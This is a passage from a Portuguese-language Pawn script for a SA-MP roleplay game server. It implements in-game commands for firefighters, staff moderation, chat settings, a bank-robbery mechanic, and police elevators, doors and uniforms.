	        if(FireBaixa[playerid] > 0)
	        {
			    if(IsPlayerInDynamicCP(playerid, CP_39))
			    {
					format(gStr, 128, "Você deu baixa no incêndio causado na casa ID {FFFFFF}%d", FireBaixa[playerid]);
			        SendClientMessage(playerid, COR_AMARELO, gStr);
			        SendClientMessage(playerid, COR_AMARELO, "Você recebe R$1500 pelo serviço concluído.");
					sGivePlayerCash(playerid, 1500);
					FireBaixa[playerid] = 0;
			    }
			    else
			    {
		        	SendClientMessage(playerid, COR_ERRO, "Você não está no Corpo de Bombeiros!");
		    	}
		    	return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não apagou nenhum incêndio!");
    		}
		    return 1;
	    }
	    else
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmdtext, "/ecaminhaob", true))
	{
	    if(pInfo[playerid][Prof] == BOMBEIRO || aInfo[playerid][Admin] == 1)
	    {
	        if(FireAtual[playerid] <= 0)
	        {
	            SendClientMessage(playerid, COR_ERRO, "Você não iniciou nenhuma rota de incêndio!");
	            SendClientMessage(playerid, COR_ERRO, "Volte para o corpo de bombeiros e utilize: /ProximoIncendio!");
	            return 1;
	        }
	        new
 	        	veiculo = GetPlayerVehicleID(playerid),
				modelo = GetVehicleModel(veiculo)
			;
		    if(modelo == 407)
		    {
		        new
					c = FireAtual[playerid]
				;
		        if(IsPlayerInRangeOfPoint(playerid, 50.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
		        {
		        	estCamB[veiculo] = 1;
		        	SetTimerEx("resetCaminhao", 120000, false, "d", veiculo);
		        	FireBaixa[playerid] = -1;
		        	SendClientMessage(playerid, COR_AMARELO, "Caminhão estacionado, você já pode apagar o incendio!");
		        }
		        else
		        {
		            SendClientMessage(playerid, COR_ERRO, "Você só pode estacionar o caminhão próximo ao incendio!");
		        }
		        return 1;
		    }
		    else
		    {
	        	SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de bombeiros!");
	    	}
		    return 1;
	    }
	    else
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/escrever", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
	    {
			tmp = strtok(cmdtext, idx);
	   		if(!strlen(tmp))
	     	{
	     	    SendClientMessage(playerid, COR_SISTEMA, "Obs: Essa alteração ocorre somente para você.");
	    	    SendClientMessage(playerid, COR_SISTEMA, "Opções: Global, Proximo");
	     	    SendClientMessage(playerid, COR_ERRO, "Uso correto: /Escrever [Opção]");
		    	return 1;
	      	}
	       	else if(!strcmp(tmp, "global", true))
	        {
	            if(pInfo[playerid][chat] == 1)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Já está definido como {00FF02}global {FF0000}o chat!");
	                return 1;
	            }
				SendClientMessage(playerid, COR_BRANCO, "Chat definido para {00FF02}Global.");
				GameTextForPlayer(playerid, "~w~~h~Chat E ~b~~h~Global", 1000, 0);
				pInfo[playerid][chat] = 1;
	        }
	        else if(strcmp(tmp, "proximo", true) == 0)
	        {
	            if(pInfo[playerid][chat] == 0)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Já está definido como {FF0000}próximo {FF0000}o chat!");
	                return 1;
	            }
				SendClientMessage(playerid, COR_BRANCO, "Chat definido para {00FF02}Próximo.");
				GameTextForPlayer(playerid, "~w~~h~Chat E ~r~~h~Proximo", 1000, 0);
				pInfo[playerid][chat] = 0;
	        }
	        return 1;
        }
        else
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
        }
        return 1;
	}
	if(!strcmp(cmd, "/verchat", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
	    {
			tmp = strtok(cmdtext, idx);
	   		if(!strlen(tmp))
	     	{
	     	    SendClientMessage(playerid, COR_SISTEMA, "Obs: Essa alteração ocorre somente para você.");
	    	    SendClientMessage(playerid, COR_SISTEMA, "Opções: Global, Proximo");
	     	    SendClientMessage(playerid, COR_ERRO, "Uso correto: /VerChat [Opção]");
		    	return 1;
	      	}
	       	else if(!strcmp(tmp, "global", true))
	        {
	            if(pInfo[playerid][vchat2] == 1)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Já está definido para ver {00FF02}global {FF0000}o chat!");
	                return 1;
	            }
				SendClientMessage(playerid, COR_BRANCO, "Chat definido para ver {00FF02}Global.");
				GameTextForPlayer(playerid, "~w~~h~Chat V ~b~~h~Global", 1000, 0);
				pInfo[playerid][vchat2] = 1;
	        }
	        else if(strcmp(tmp, "proximo", true) == 0)
	        {
	            if(pInfo[playerid][vchat2] == 0)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Já está definido para ver {FF0000}próximo {FF0000}o chat!");
	                return 1;
	            }
				SendClientMessage(playerid, COR_BRANCO, "Chat definido para ver {00FF02}Próximo.");
				GameTextForPlayer(playerid, "~w~~h~Chat V ~r~~h~Proximo", 1000, 0);
				pInfo[playerid][vchat2] = 0;
	        }
	        return 1;
        }
        else
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
        }
        return 1;
	}
	if(!strcmp(cmdtext, "/acmds", true))//USARCHAT
	{
        if(aInfo[playerid][Moderador] == 1 || aInfo[playerid][Admin] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
        {
		    new
		    	stg[1500]
	    	;
	    	format(gstring, sizeof(gstring), "{1E90FF}Comandos para ajudantes e corregedores:{FFFFFF}");
	    	strcat(stg, gstring);
	    	format(gstring, sizeof(gstring), "\n/Kick, /Ir, /Trazer, /Avisar, /Espiar, * [Texto], /An, /pConsertar, /pConectado, /Aj(udar)");
	    	strcat(stg, gstring);
	    	if(aInfo[playerid][Moderador] == 1 || aInfo[playerid][Admin] == 1)
	    	{
    			format(gstring, sizeof(gstring), "\n\n{1E90FF}Comandos para moderadores:{FFFFFF}");
	    		strcat(stg, gstring);
	    		format(gstring, sizeof(gstring), "\n/Ban, + [Texto], /Desbanir [Nick], /DesbanirIP [IP], /Consertar");
	    		strcat(stg, gstring);
	    		format(gstring, sizeof(gstring), "\n/VerComandos, /An, /TrespawnVeiculos, /RespawnVeiculos, /RespawnVeiculo, /Cv, /Dv, /Flip");
	    		strcat(stg, gstring);
	    		if(aInfo[playerid][Admin] == 1)
	    		{
               		format(gstring, sizeof(gstring), "\n\n{FF1E1E}Comandos para administradores:{FFFFFF}");
		        	strcat(stg, gstring);
		        	format(gstring, sizeof(gstring), "\n/ocultar, /desocultar, /setarskin, /an, /vercomandos, /desbugarbanco, /ocultar, /desocultar, /evento, /fakecmd");
		        	strcat(stg, gstring);
		        	format(gstring, sizeof(gstring), "\n/explodir, /desbugarcasa, /setarveiculo, /liberarnick, /desbanirip, /congelar, /descongelar, /kill");
			        strcat(stg, gstring);
			        format(gstring, sizeof(gstring), "\n/desbanir, /verip, /versaldo, /versaldob, /setarnivel, /setargrana, /setarsaldo, /dargrana, /aprender, /asoltar");
		        	strcat(stg, gstring);
	    	    	format(gstring, sizeof(gstring), "\n/aprenderoff, /banoff, /desbanir, /desbanirip, /ejetar, /injetar, /jetpack, /limparchat, /calar, /descalar, /ecmds");
	    	    	strcat(stg, gstring);
	    	    	format(gstring, sizeof(gstring), "\n/ativarchat, /desativarchat, /ativarcomandos, /desativarcomandos, /contar, /espiar, /EspiarOff, /dararma, /desarmar");
	    	    	strcat(stg, gstring);
	    	    	format(gstring, sizeof(gstring), "\n/clima, /ir, /irveiculo, /trazer, /trazertodos, /tempo, /ban, /kick, /cv, /dv, /flip, /vidaveiculo, /vidaveiculos");
		        	strcat(stg, gstring);
		        	format(gstring, sizeof(gstring), "\n/tapa, /explodir, /vidatodos, /vida, /pcolete, /godmode, /abrirvotacao, /fecharvotacao, /apurar.");
		           	strcat(stg, gstring);
	       		}
			}
	    	ShowPlayerDialog(playerid, 1457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Comandos da Staff - World Evolution RPG ", stg, "OK", "");
		}
		return 1;
	}
	if(!strcmp(cmd, "/infoban", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /InfoBan [Nick]");
                return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
  			if(!fexist(gFile))
			{
				SendClientMessage(playerid, COR_ERRO, "Não existe nenhuma conta com esse nick!");
				return 1;
			}
			new
				nome[64], banido[5], casa[24]
			;
			if(WE_GetInt(gFile, "Banido") == 1)
			{
			    banido = "SIM";
			}
			else
			{
			    banido = "NÃO";
			}
			new
				CasaID = WE_GetInt(gFile, "Casa")
			;
			if(CasaID > 0)
			{
				if(!strcmp(CasaInfo[CasaID][Proprietario], tmp, true))
				{
				    format(casa, 24, "SIM | Casa ID %d", CasaID);
				}
				else if(strcmp(CasaInfo[CasaID][Proprietario], tmp, false))
				{
    				WE_SetInt(gFile, "Casa", -1);
    				casa = "NENHUMA";
				}
			}
			new lvl = WE_GetInt(gFile, "Level");
			new bbb = WE_GetInt(gFile, "SaldoBanco");
			new ddd = WE_GetInt(gFile, "Dinheiro");
			new bnp[24];
			format(bnp, 24, "%s", WE_GetString(gFile, "BanidoPor"));
			new mtb[24];
			format(mtb, 24, "%s", WE_GetString(gFile, "MotivoBan"));
			format(s5Doze, sizeof(s5Doze), "Nível %d\nBanco R$%d | Mãos R$%d\nBanido %s | Responsável %s | Motivo %s\nCasa %s\nLogin %s | Hora %s\n\nRegistrou-se %s", lvl, bbb, ddd, banido, bnp, mtb, casa, WE_GetString(gFile, "ulData"), WE_GetString(gFile, "ulHorario"), WE_GetString(gFile, "regData"));
			format(nome, 64, "{FF0000}{1E90FF} Info {FFFFFF}%s", tmp);
			ShowPlayerDialog(playerid, 1457, DIALOG_STYLE_MSGBOX, nome, s5Doze, "OK", "");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/pconectado", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
			tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /PConectado [Nick]");
                return 1;
			}
			if(pConectadoa(tmp))
			{
			 	foreach(Player, i)
				{
				    if(!strcmp(PlayerName(i), tmp, false))
				    {
				    	format(gStr, 128, "O(A) jogador(a) %s está online, ID %d.", tmp, i);
			    		SendClientMessage(playerid, COR_AMARELO, gStr);
			    		break;
					}
				}
			}
			else
			{
			    format(gStr, 128, "O(A) jogador(a) %s não está conectado!", tmp);
			    SendClientMessage(playerid, COR_ERRO, gStr);
			}
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/varma", true))
	{
	 	if(pInfo[playerid][Prof] == TRAF_ARMAS || pInfo[playerid][Prof] == CHEFE_MAFIA || aInfo[playerid][Admin] == 1)
	    {
			ShowPlayerDialog(playerid, D_PARMA, DIALOG_STYLE_LIST, "Armas para venda:", "\tSilenced 9mm\n\tShotgun\n\tAK-47\n\tSniper Rifle", "Escolher", "Cancelar");
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) traficante de armas ou mafioso!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/assaltar", true))
	{
 		new pname[MAX_PLAYER_NAME];
  		GetPlayerName(playerid,pname,sizeof(pname));
	    if(pInfo[playerid][Prof] == HITMAN || pInfo[playerid][Prof] == ATIRADOR || pInfo[playerid][Prof] == TERRORISTA || pInfo[playerid][Prof] == CHEFE_MAFIA || pInfo[playerid][Prof] == TRAF_ARMAS || pInfo[playerid][Prof] == TRAF_DROGAS || pInfo[playerid][Prof] == CONTRABANDISTA)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 3.0, 1767.4434,-1699.8270,13.5096))
	        {
				if(bRoubado == false)
				{
					if(Roubou[playerid] == false)
					{
				   		if(pAssalto[playerid] < 50)
				    	{
				    		SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+4);
				    		foreach(Player, i)
        					{
								if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
								{
									SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) {FFFFFF}%s {FF1E1E}está assaltando o banco de LS!", pname);
								}
							}
             	        	SendClientMessage(playerid, AZUL_WE, "Você é novato(a), aguarde 30 segundos para concluir o roubo!");
							Roubando[playerid] = true;
							Roubou[playerid] = true;
							bRoubado = true;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
							FimAssalto[playerid] = SetTimerEx("ConcluirAssalto", 30000, false, "i", playerid);
							AnimRoubo[playerid] = SetTimerEx("AnimAssalto", 500,0,"i", playerid);
							SetTimer("BancoRoubado", 1500000, false);
							return 1;
						}
						else if(pAssalto[playerid] >= 50 && pAssalto[playerid] < 150)
				    	{
				    		SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+4);
				    		foreach(Player, i)
        					{
								if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
								{
									SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) {FFFFFF}%s {FF1E1E}está assaltando o banco de LS!", pname);
								}
							}
							SendClientMessage(playerid, AZUL_WE, "Você é intermediário(a), aguarde 25 segundos para concluir o roubo!");
							Roubando[playerid] = true;
							Roubou[playerid] = true;
							bRoubado = true;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
							FimAssalto[playerid] = SetTimerEx("ConcluirAssalto", 25000, false, "i", playerid);
							AnimRoubo[playerid] = SetTimerEx("AnimAssalto", 500,0,"i", playerid);
							SetTimer("BancoRoubado", 1500000, false);
							return 1;
						}
						else if(pAssalto[playerid] >= 150 && pAssalto[playerid] < 300)
				    	{
				    		SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+4);
				    		foreach(Player, i)
        					{
								if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
								{
									SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) {FFFFFF}%s {FF1E1E}está assaltando o banco de LS!", pname);
								}
							}
	             	        SendClientMessage(playerid, AZUL_WE, "Você é experiênte, aguarde 20 segundos para concluir o roubo!");
							Roubando[playerid] = true;
							Roubou[playerid] = true;
							bRoubado = true;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
							FimAssalto[playerid] = SetTimerEx("ConcluirAssalto", 20000, false, "i", playerid);
							AnimRoubo[playerid] = SetTimerEx("AnimAssalto", 500,0,"i", playerid);
							SetTimer("BancoRoubado", 1500000, false);
							return 1;
						}
						else if(pAssalto[playerid] >= 300 && pAssalto[playerid] < 500)
					    {
					    	SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+3);
						    ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
				    		foreach(Player, i)
        					{
								if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
								{
									SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) {FFFFFF}%s {FF1E1E}está assaltando o banco de LS!", pname);
								}
							}
	             	        SendClientMessage(playerid, AZUL_WE, "Você é veterano(a), aguarde 20 segundos para concluir o roubo!");
							Roubando[playerid] = true;
							Roubou[playerid] = true;
							bRoubado = true;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
							FimAssalto[playerid] = SetTimerEx("ConcluirAssalto", 20000, false, "i", playerid);
							AnimRoubo[playerid] = SetTimerEx("AnimAssalto", 500,0,"i", playerid);
							SetTimer("BancoRoubado", 1500000, false);
							return 1;
						}
						else if(pAssalto[playerid] >= 500)
					    {
					    	SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+3);
				    		foreach(Player, i)
        					{
								if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
								{
									SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) {FFFFFF}%s {FF1E1E}está assaltando o banco de LS!", pname);
								}
							}
							Roubando[playerid] = true;
							Roubou[playerid] = true;
							bRoubado = true;
							ClearAnimations(playerid);
							ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
							FimAssalto[playerid] = SetTimerEx("ConcluirAssalto", 15000, false, "i", playerid);
							AnimRoubo[playerid] = SetTimerEx("AnimAssalto", 500,0,"i", playerid);
							SetTimer("BancoRoubado", 1500000, false);
							return 1;
						}
					}
				    else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você já cometeu um assalto recentemente, deve aguardar um total de 25 minutos!");
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "O banco foi assaltado recentemente, deve aguardar um total de 25 minutos!");
				}
				return 1;
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está em um local de assalto!");
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) criminoso(a)!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/guarita", true))
	{
	    if(getPolicial(playerid))
	    {
	        if(IsPlayerInRangeOfPoint(playerid,2.0,1551.3929,-1618.7386,13.5469))
	        {
		        SetPlayerPos(playerid,1542.0199,-1617.0093,22.2718);
		        SetPlayerFacingAngle(playerid,172.6992);
		        return 1;
			}
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/descerdp", true))
	{
	    if(getPolicial(playerid))
	    {
	        if(IsPlayerInRangeOfPoint(playerid,5.0,1542.0199,-1617.0093,22.2718))
	        {
		        SetPlayerPos(playerid,1551.3929,-1618.7386,13.5469);
		        SetPlayerFacingAngle(playerid,356.0009);
		        return 1;
			}
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/pmecanica", true))
	{
	    if(pInfo[playerid][Prof] == MECANICO || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1)
	    {
	        if(IsPlayerInRangeOfPoint(playerid,10.0,1711.38440, -1742.92334, 13.33880))
	        {
	            if(CancelaAb == false)
	            {
	            	MoveObject(CancelaMec,1711.38440, -1742.92334, 13.33880+0.0001, 0.0001,  0.00000, 0.00000, 0.00000);
	            	CancelaAb = true;
	            	return 1;
				}
				else
				{
	            	MoveObject(CancelaMec,1711.38440, -1742.92334, 13.33880, 0.0001,  0.00000, -90.00000, 0.00000);
	            	CancelaAb = false;
	            	return 1;
				}
			}
			else if(IsPlayerInRangeOfPoint(playerid,10.0,1708.32507, -1778.44031, 16.69300))
	        {
	            if(PortaoMAb == false)
	            {
	            	MoveObject(PortaoMec,1708.36536, -1778.42798, 16.79370, 0.5,  0.00000, -90.00000, 90.00000);
	            	PortaoMAb = true;
	            	return 1;
				}
				else
				{
	            	MoveObject(PortaoMec,1708.36975, -1778.50806, 14.05370, 0.5,  0.00000, 0.00000, 90.00000);
	            	PortaoMAb = false;
	            	return 1;
				}
			}
			return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não tem permissão!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/pagencia", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
	        if(CancelaAgAB == true)
			{
	           	MoveObject(CancelaAg,1270.39502, -1334.99829, 13.13520+0.0001, 0.0001,  0.00000, -90.00000, 90.00000);
	           	CancelaAgAB = false;
	           	return 1;
			}
			else
	        {
	           	MoveObject(CancelaAg,1270.39185, -1334.97852, 13.13520+0.0001, 0.0001,  0.00000, 0.00000, 90.00000);
	           	CancelaAgAB = true;
	           	return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não tem permissão!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/subir", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
	    {
	        if(!IsPlayerInRangeOfPoint(playerid,2.0,1572.1257,-1656.4021,2.1800))
			{
				SendClientMessage(playerid,COR_ERRO,"Você não está próximo(a) ao painel interno do elevador!");
				return 1;
			}
	        if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(elevadordp,1570.57593, -1655.18555, 17.09180, 3.0,   0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Você está subindo para o andar principal.");
			SetTimer("AbrirElevador", 4000, false);
			SetTimer("FecharElevador", 7000, false);
		  	return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um(a) policial!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/descer", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,3.0,1568.8434,-1657.9930,16.2304))
			{
				SendClientMessage(playerid,COR_ERRO,"Você não está próximo(a) ao painel do elevador!");
				return 1;
			}
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(elevadordp,1570.57593, -1655.18555, 17.09180, 50.0,   0.00000, 0.00000, 90.00000);
		    MoveObject(portaelevador[0],1572.11816, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			MoveObject(portaelevador[1],1567.10999, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"O elevador descerá para o andar das celas em 3 segundos.");
			SetTimer("DescerElevador", 3000, false);
			SetTimer("FecharElevador", 3000, false);
		  	return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um(a) policial!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/descerelev", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,3.0,1570.5574,-1657.8357,2.0466))
			{
				SendClientMessage(playerid,COR_ERRO,"Você não está em frente ao acesso do elevador!");
				return 1;
			}
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(elevadordp, 1570.57593, -1655.18555, 2.98000, 3.0,   0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Você chamou o elevador.");
		  	return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um(a) policial!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/abrirelev", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,2.0,1572.1202,-1656.6772,16.2918))
			{
				SendClientMessage(playerid,COR_ERRO,"Você não está próximo(a) ao painel do elevador!");
				return 1;
			}
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
		    MoveObject(portaelevador[0],1572.11816, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			MoveObject(portaelevador[1],1567.10999, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
			SendClientMessage(playerid,-1,"Portas abertas.");
			SetTimer("FecharElevador",3000,false);
		  	return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um(a) policial!");
		    return 1;
		}
	}
 	if(!strcmp(cmd, "/pcelas", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,3.0,1566.94397, -1658.47510, 3.47870))
			{
				SendClientMessage(playerid,COR_ERRO,"Você não está próximo(a) a porta!");
				return 1;
			}
			if(pInfo[playerid][Preso] > 0)
			{
				SendClientMessage(playerid,COR_ERRO,"Você está preso(a)!");
				return 1;
			}
			MoveObject(portacelas,1566.95386, -1656.75439, 3.47870, 3.0,  0.00000, 0.00000, 0.00000);
			SetTimer("FecharPCelas", 2000, false);
			return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um(a) policial!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/colete", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
			if(pInfo[playerid][Prof] == POL_CIVIL && !IsPlayerInRangeOfPoint(playerid, 1.0, -1614.6805, 682.0648, 7.1875))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_MILITAR && !IsPlayerInRangeOfPoint(playerid, 1.0, 1567.8698,-1670.0620,16.2505))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_FEDERAL && !IsPlayerInRangeOfPoint(playerid, 1.0, 2252.5640, 2491.4509, 10.9908))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == GUARDA_TRANSITO && !IsPlayerInRangeOfPoint(playerid, 1.0, -223.6873, 988.3895, 19.6491))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_RODOVIARIO && !IsPlayerInRangeOfPoint(playerid, 1.0, 618.8519,-584.8560,17.2266))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][fardado] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa estar fardado(a) para vestir o colete!");
			    return 1;
			}
			pInfo[playerid][ccolete] = 1;
			SetPlayerArmour(playerid, 100.0);
			SendClientMessage(playerid, COR_CEU, "Você vestiu seu colete.");
		}
		return 1;
	}
	if(!strcmp(cmd, "/farda", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
			if(pInfo[playerid][Prof] == POL_CIVIL && !IsPlayerInRangeOfPoint(playerid, 1.0, -1614.6555, 686.4517, 7.1875))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_MILITAR && !IsPlayerInRangeOfPoint(playerid, 1.0, 1568.0817,-1667.5648,16.2505))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_FEDERAL && !IsPlayerInRangeOfPoint(playerid, 1.0, 2250.6257, 2490.3950, 10.9908))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == GUARDA_TRANSITO && !IsPlayerInRangeOfPoint(playerid, 1.0, -220.7423, 988.4965, 19.6317))
			{
